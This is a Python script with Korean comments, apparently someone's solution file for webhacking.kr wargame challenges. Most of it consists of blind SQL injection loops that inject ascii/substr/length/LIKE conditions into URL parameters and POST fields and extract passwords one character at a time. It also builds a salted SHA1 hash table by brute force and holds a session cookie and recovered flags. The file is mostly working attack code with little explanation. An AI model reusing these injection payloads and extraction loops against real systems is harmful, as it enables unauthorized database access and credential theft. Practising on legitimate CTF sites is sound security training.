import requests
import hashlib
url="https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20"


cookie={"PHPSESSID":"eldl4tjjv0gaivmrgjmgujb6hm"}
session=requests.Session()

password=""
passwd=""

"""
#score = 1 limit x,1 procedure analyse() x번째 속성값을 가져온다.
#length(p4ssw0rd_1123581321) 로 길이를 알아냄. 알아낼 수 없다면 일정값 이상으로 지정해두고 하면됨. 50자이상의 비밀번호는 거의 없는 것.
for i in range(2,32): #원래는 1 부터 길이+1 까지
    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
        payload=session.get(url+"left(p4ssw0rd_1123581321,"+str(i)+")="+password+format(j,'x'),cookies=cookie) #왼쪽부터 몇글자에 비밀번호 체크 한자씩 추가해가며 검사
        if("jso109817" in payload.text): #위의 리퀘스트 결과 내용에서 특정 이름이 있는지 가져옴.
            print(chr(j)+"is correct!!!!!!!")
            password += format(j,'x') #비밀번호에 있으니까 hex값으로 추가
            passwd += chr(j) #표기할 비밀번호니까 아스키문자로 변경
            break
        print(chr(j)+"is incorrect")
print(passwd) #flag 값
"""


url="https://webhacking.kr/challenge/bonus-1/index.php?id=1%27+or+ascii%28substr%28id%2C"
urlend = "%23&pw=asdasd"
pwlength = 0;
url2="https://webhacking.kr/challenge/bonus-1/index.php?id=1%27+or+length%28pw%29%3D"
# 'or 1=1 같은 값을 통해 참값일때 반응을 먼저 알아낸다.
'''
for i in range(2,35): # 최대 길이를 알아내는 방법 
    payload=session.get(url2+str(i)+urlend,cookies=cookie) #length(?)='값' 을 통해 ?의 길이를 알아낼 수 있다.
    if("wrong password" in payload.text): #참일때 나오는 값을 알아야함.
        print(str(i)+"패스워드 길이!!")
        print(i)
'''
'''
for i in range(1,6): #원래는 1 부터 길이+1 까지
    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
        payload=session.get(url+str(i)+"%2C1%29%29%3D"+str(j)+urlend,cookies=cookie) #ascii함수 + substr(?,i,1)를 통해 ?의 str(i)번째 글자를 str(j)와 비교하여 알아낸다. 
        #print(url+str(i)+"%2C1%29%29%3D"+str(j)+urlend)
        if("wrong password" in payload.text): # 단점은 모든 표를 검사하므로 여러가지 아이디,비밀번호가 섞여 나올 수 있다.
            print(chr(j)+" is correct!!!!!!!")
            password += " "
            password += str(j)
            passwd += chr(j)
        #print(str(j)+chr(j)+" is incorrect")

print(passwd) 원하는 값
'''

#아이디 비번 알아내서 로그인할려했는데 admin이 필터링 되어있는듯 로그인이 안됨. 그래서 ADMIN 대문자로 했더니 성공!(아마 MSSQL에 대소문자 처리 안되어있어서 php에서만 admin을 거르는것 같음)
password= "FLAG_himIKO_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
password2="flag{HIM_ko_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
passwd="flag{"
url="https://webhacking.kr/challenge/web-33/index.php?"
'''
print(password2.lower())
for i in range(1,50): #원래는 1 부터 길이+1 까지
    for j in range(65, 96): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
        if(chr(j)=="%"):
            continue
        payload=session.post(url,data={"search":passwd+chr(j)},cookies=cookie)
        if ("readme" in payload.text):
            print(chr(j) + " is correct!!!!!!!")
            passwd += chr(j)
            print(passwd)
            break

print(passwd)
'''
'''
url="https://webhacking.kr/challenge/web-04/index.php?"
def sha(no): ## sha값 계산, 500번
    data = f"{no}salt_for_you"
    for i in range(0,500):
        data = hashlib.sha1(data.encode('utf-8')).hexdigest()
    return data
#레인보우 테이블 만들기
f= open("dictionary.txt","w")
for i in range(10000000, 99999999):
    f.write(f"{i}: {sha(i)}\n") #{no}salt_for_you를 500번 해쉬한값을 모두 저장
    print(i)
f.close()
'''
url="https://webhacking.kr/challenge/web-09/index.php?no=IF(substr(id,"
passwd=""
'''
for i in range(1,12): #IF(LENGTH(id)LIKE(길이),3,5) 로 길이를 먼저 알아낸 후 길이만큼 루프
    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
        if(chr(j)=="%"):
            continue
        payload=session.get(url+str(i)+",1)LIKE("+hex(j)+"),3,5)",cookies=cookie) #substr로 한글자씩 검사.
        print(url+str(i)+",1)LIKE("+format(j,'x')+"),3,5)")
        if ("Secret" in payload.text):
            print(chr(j) + " is correct!!!!!!!")
            passwd += chr(j)
            print(passwd)
    passwd +=" "
print(passwd) #alsrkswhaql
'''

passwd=""
url="https://webhacking.kr/challenge/bonus-2/index.php"
'''
payload = session.post(url, data={"uuid": "asz' or length(pw)=32#", "pw": "asaa"},cookies=cookie)
if ("Wrong password!" in payload.text):
    print("correct!!!!!!!")

for i in range(1,33): #원래는 1 부터 길이+1 까지
    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')

        payload=session.post(url,data={"uuid":"admin' and ascii(substr(pw,"+str(i)+",1))="+hex(j)+"#","pw":""},cookies=cookie)
        print(url+" / uuid : admin' and substr(pw,"+str(i)+",1)="+chr(j)+" : "+hex(j)+"#" +"  pw : ")
        if ("Wrong password!" in payload.text):
            print(chr(j) + " is correct!!!!!!!")
            passwd += chr(j)
            passwd += " "
            print(passwd)

print(passwd)
'''